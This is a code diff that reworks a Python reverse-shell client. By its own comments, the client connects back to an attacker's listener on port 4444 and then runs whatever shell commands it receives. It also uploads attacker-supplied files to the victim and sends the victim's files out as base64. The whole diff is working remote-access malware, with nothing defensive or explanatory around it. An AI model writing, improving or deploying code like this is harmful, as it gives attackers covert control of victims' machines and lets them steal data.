@@ -10,40 +10,40 @@ PORT = 4444  # Replace with the port the attacker is listening on
 
 # Function to execute commands on the target machine
 def execute_command(command):
-    # Execute the command and return the result
     return subprocess.run(command, shell=True, capture_output=True)
 
+# Function to send JSON data
 def send_json(sock, data):
-    json_data = json.dumps(data)  # Convert to JSON
-    sock.send(json_data.encode())  # Encode to bytes before sending
+    json_data = json.dumps(data)
+    sock.sendall(json_data.encode())
 
+# Function to receive JSON data
 def receive_json(sock):
     json_data = ""
     while True:
         try:
-            json_data += sock.recv(1024).decode()
-            return json.loads(json_data)  # Decode JSON
+            json_data = json_data + sock.recv(1024).decode()
+            return json.loads(json_data)
         except ValueError:
             continue
 
+# Function to read a file and encode it in base64
 def read_file(path):
-    with open(path, "rb") as file:  # RB FOR READABLE BINARY FILE
-        return base64.b64encode(file.read()).decode()  # Decode bytes to string
+    with open(path, "rb") as file:
+        return base64.b64encode(file.read()).decode()
 
+# Function to write a file from base64 content
 def write_file(path, content):
-    with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
+    with open(path, "wb") as file:
         file.write(base64.b64decode(content))
-        return "[+] Upload successful [+]"
+    return "[+] Upload successful [+]"
 
 # Create a socket object to connect back to the attacker
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Attempt to connect to the attacker's server
 try:
     sock.connect((HOST, PORT))
-
-    # Send an initial message to show the connection is established
-    send_json(sock, "Successfully connected to the client.")
+    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))
 
     default_prompt = "admin@medusax~$ "
     current_prompt = default_prompt
@@ -51,77 +51,66 @@ try:
 
     while True:
         # Send the current prompt to the server
-        send_json(sock, current_prompt)
+        sock.sendall(current_prompt.encode("utf-8"))
 
         # Receive the command from the server
         command = receive_json(sock)
 
         # Handle the 'km' command to completely disconnect
-        if command.lower() == "km":
-            send_json(sock, "Disconnecting...")
+        if command[0] == "km":
             sock.close()
             break
 
+        # Handle the 'upload' command
+        elif command[0] == "upload":
+            response = write_file(command[1], command[2])
+
+        # Handle the 'download' command
+        elif command[0] == "download":
+            try:
+                response = read_file(command[1])
+            except Exception as e:
+                response = str(e)
+
         # Handle the 'shell' command to enter the shell mode
-        if command.lower() == "shell":
+        elif command[0] == "shell":
             try:
                 os.chdir("C:\\")
                 in_shell_mode = True  # Enable shell mode
                 current_prompt = f"{os.getcwd()} > "
-                send_json(sock, "Entering remote shell mode. Type 'exit' to leave.")
+                response = "Entering remote shell mode. Type 'exit' to leave."
             except Exception as e:
-                send_json(sock, f"Failed to switch to C:\\: {e}")
-            continue
+                response = f"Failed to switch to C:\\: {e}"
 
         # Handle the 'shell -d <directory>' command to set a specific directory
-        if command.startswith("shell -d"):
+        elif command[0].startswith("shell -d"):
             try:
-                _, _, directory = command.partition("-d")
-                directory = directory.strip()
+                directory = command[1]
                 os.chdir(directory)  # Change to the specified directory
                 in_shell_mode = True  # Enable shell mode
                 current_prompt = f"{os.getcwd()} > "
-                send_json(sock, f"Changed directory to {directory}")
+                response = f"Changed directory to {directory}"
             except Exception as e:
-                send_json(sock, f"Failed to change directory: {e}")
-            continue
-
-        # Handle the 'upload' command
-        if command.startswith("upload"):
-            try:
-                _, filename, file_content = command.split(" ", 2)
-                response = write_file(filename, file_content)
-                send_json(sock, response)
-            except Exception:
-                send_json(sock, "[+] Error during upload [+]")
-            continue
-
-        # Handle the 'download' command
-        if command.startswith("download"):
-            try:
-                _, filename = command.split(" ", 1)
-                response = read_file(filename)
-                send_json(sock, response)
-            except Exception:
-                send_json(sock, "[+] Error during download [+]")
-            continue
+                response = f"Failed to change directory: {e}"
 
         # If in shell mode, process shell commands
-        if in_shell_mode:
-            if command.lower() == "exit":
+        elif in_shell_mode:
+            if command[0] == "exit":
                 # Exit the shell and return to the default prompt
                 in_shell_mode = False  # Disable shell mode
                 current_prompt = default_prompt
-                send_json(sock, "Exiting remote shell mode.")
-                continue
+                response = "Exiting remote shell mode."
+            else:
+                # Execute the received shell command
+                output = execute_command(" ".join(command))
+                response = output.stdout.decode() + output.stderr.decode()
 
-            # Execute the received shell command
-            output = execute_command(command)
-            send_json(sock, output.stdout.decode() + output.stderr.decode())
-            continue
+        # If not in shell mode, reject unrecognized commands
+        else:
+            response = "Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect."
 
-        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
-        send_json(sock, "Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.")
+        # Send the response back to the server
+        send_json(sock, response)
 
 except Exception as e:
     print(f"Error: {e}")
